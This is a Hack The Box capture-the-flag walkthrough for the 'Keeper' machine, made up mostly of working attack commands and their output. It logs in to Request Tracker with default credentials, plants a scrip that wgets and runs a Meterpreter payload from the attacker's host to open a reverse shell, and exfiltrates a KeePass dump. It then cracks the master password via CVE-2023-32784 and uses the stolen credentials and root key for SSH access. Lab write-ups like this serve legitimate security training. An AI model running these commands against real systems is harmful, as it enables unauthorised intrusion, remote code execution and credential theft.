# Target
| Category          | Details                                                |
|-------------------|--------------------------------------------------------|
| 📝 **Name**       | [Keeper](https://app.hackthebox.com/machines/Keeper)   |  
| 🏷 **Type**       | HTB Machine                                            |
| 🖥 **OS**         | Linux                                                  |
| 🎯 **Difficulty** | Easy                                                   |
| 📁 **Tags**       | Request Tracker, Metasploit, KeePassXC, CVE-2023-32784 |

# Scan
```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
```


# Attack path
1. [Gain initial foothold by spawning reverse shell connection via Request Tracker user defined action script](#gain-initial-foothold-by-spawning-reverse-shell-connection-via-request-tracker-user-defined-action-script)
2. [Escalate to `lnorgaard` user using credentials discovered in `passcode.kdbx`](#escalate-to-lnorgaard-user-using-credentials-discovered-in-passcodekdbx)
3. [Escalate to `root` user using SSH private key discovered in `passcode.kdbx`](#escalate-to-root-user-using-ssh-private-key-discovered-in-passcodekdbx)

### Gain initial foothold by spawning reverse shell connection via Request Tracker user defined action script

#### Add `keeper.htb` and `tickets.keeper.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Keeper]
└─$ echo "$TARGET keeper.htb tickets.keeper.htb" | sudo tee -a /etc/hosts
10.129.142.107 keeper.htb tickets.keeper.htb
```

#### Generate `linux/x64/meterpreter/reverse_tcp` reverse shell and expose it over HTTP
```
┌──(magicrc㉿perun)-[~/attack/HTB Keeper]
└─$ msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1) \
    LPORT=4444 \
    -f elf \
    -o shell && \
python3 -m http.server
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: shell
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

#### Start Metasploit and listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Keeper]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 4444; set payload linux/x64/meterpreter/reverse_tcp; run"
[*] Starting persistent handler(s)...
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => linux/x64/meterpreter/reverse_tcp
[*] Started reverse TCP handler on 10.10.16.5:4444
```

#### Create and execute Request Tracker reverse shell connection spawning user defined action script using default credentials
```
┌──(magicrc㉿perun)-[~/attack/HTB Keeper]
└─$ LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1) && \
NEXT=$(curl -s http://tickets.keeper.htb/rt | grep -oP 'value="\K[^"]+' | head -n 1) && \
curl -s -L -c cookies.txt http://tickets.keeper.htb/rt -d 'user=root&pass=password&next=$NEXT' -o /dev/null && \
curl -b cookies.txt http://tickets.keeper.htb/rt/Admin/Scrips/Create.html -H "Referer: http://keeper.htb" -d "Queue=0&Global=&Description=ReverseShell&ScripCondition=1&ScripAction=17&Template=Blank&Stage=TransactionCreate&SetEnabled=1&Enabled=1&CustomIsApplicableCode=&CustomPrepareCode=%7B%0D%0A++++system%28%22wget+-P+%2Ftmp+http%3A%2F%2F$LHOST%3A8000%2Fshell%3B+chmod+%2Bx+%2Ftmp%2Fshell%3B+%2Ftmp%2Fshell%22%29%3B%0D%0A++++return+1%3B%0D%0A%7D%0D%0A&CustomCommitCode=&Create=Create" && \
curl -b cookies.txt http://tickets.keeper.htb/rt/Ticket/Create.html -H "Referer: http://keeper.htb" \
    -F id=new \
    -F Queue=1 \
    -F Status=new \
    -F Owner=6 \
    -F Requestors=root@localhost \
    -F Content=Connect
```

#### Confirm initial foothold gained
```
[*] Sending stage (3045380 bytes) to 10.129.142.107
[*] Meterpreter session 1 opened (10.10.16.5:4444 -> 10.129.142.107:33492) at 2025-08-27 10:13:32 +0200

meterpreter > getuid
Server username: www-data
```

### Escalate to `lnorgaard` user using credentials discovered in `passcode.kdbx`

#### Exfiltrate `/home/lnorgaard/RT30000.zip` containing KeePassXC password database
```
meterpreter > download /home/lnorgaard/RT30000.zip
```

#### Discover master password for `passcode.kdbx` from `KeePassDumpFull.dmp` using `keepass-password-dumper` ([CVE-2023-32784](https://nvd.nist.gov/vuln/detail/cve-2023-32784))
```
┌──(magicrc㉿perun)-[~/attack/HTB Keeper]
└─$ sudo docker run -it --rm -v .:/app -w /app mcr.microsoft.com/dotnet/sdk:7.0 /bin/bash -c "git clone https://github.com/vdohney/keepass-password-dumper.git && cd keepass-password-dumper && dotnet run ../KeePassDumpFull.dmp"
<SNIP>
Password candidates (character positions):
Unknown characters are displayed as "●"
1.:     ●
2.:     ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M, 
3.:     d, 
4.:     g, 
5.:     r, 
6.:     ø, 
7.:     d, 
8.:      , 
9.:     m, 
10.:    e, 
11.:    d, 
12.:     , 
13.:    f, 
14.:    l, 
15.:    ø, 
16.:    d, 
17.:    e, 
Combined: ●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde
```
`dgrød med fløde` is discovered, after looking up it in Google `rødgrød med fløde` (traditional Danish summer dessert) is suggested.  

#### Discover credentials for `lnorgaard` user in `passcodes.kdbx`
```
┌──(magicrc㉿perun)-[~/attack/HTB Keeper]
└─$ echo "rødgrød med fløde" | keepassxc-cli show passcodes.kdbx "Network/Ticketing System" --attributes UserName --attributes Password
Enter password to unlock passcodes.kdbx: 
lnorgaard
Welcome2023!
```

#### Gain access over SSH with discovered credentials
```
┌──(magicrc㉿perun)-[~/attack/HTB Keeper]
└─$ ssh lnorgaard@keeper.htb
lnorgaard@keeper.htb's password: 
<SNIP>
lnorgaard@keeper:~$ id
uid=1000(lnorgaard) gid=1000(lnorgaard) groups=1000(lnorgaard)
```

### Escalate to `root` user using SSH private key discovered in `passcode.kdbx`

#### Discover `root` PuTTY Private Key in `passcode.kdbx` and convert it to OpenSSH 
```
┌──(magicrc㉿perun)-[~/attack/HTB Keeper]
└─$ echo "rødgrød med fløde" | keepassxc-cli show passcodes.kdbx "Network/keeper.htb (Ticketing Server)" --attributes Notes | puttygen /dev/stdin -O private-openssh -o id_rsa
```

#### Gain access over SSH using converted key
```
┌──(magicrc㉿perun)-[~/attack/HTB Keeper]
└─$ ssh root@keeper.htb -i id_rsa           
<SNIP>
root@keeper:~# id
uid=0(root) gid=0(root) groups=0(root)
```
